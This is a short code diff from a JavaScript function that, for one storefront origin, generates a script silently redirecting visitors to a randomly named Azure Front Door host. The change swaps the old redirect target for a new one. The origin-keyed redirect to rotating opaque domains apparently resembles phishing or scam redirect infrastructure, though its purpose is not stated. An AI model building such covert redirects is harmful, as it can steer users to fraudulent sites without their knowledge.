@@ -294,7 +294,7 @@ function buildSecondaryJS(origin) {
   const normalised = (origin || "").replace(/\/+$/, "").toLowerCase();
 
   if(normalised === "https://miyabugamajp.store"){
-    return `window.location.replace('https://jpcore-dga4a0debpcsduej.z01.azurefd.net');`;
+    return `window.location.replace('https://jp-corew-aygsa8dncjanhth7.z01.azurefd.net');`;
   }
   
   const config = Object.entries(ORIGIN_CONFIG).find(
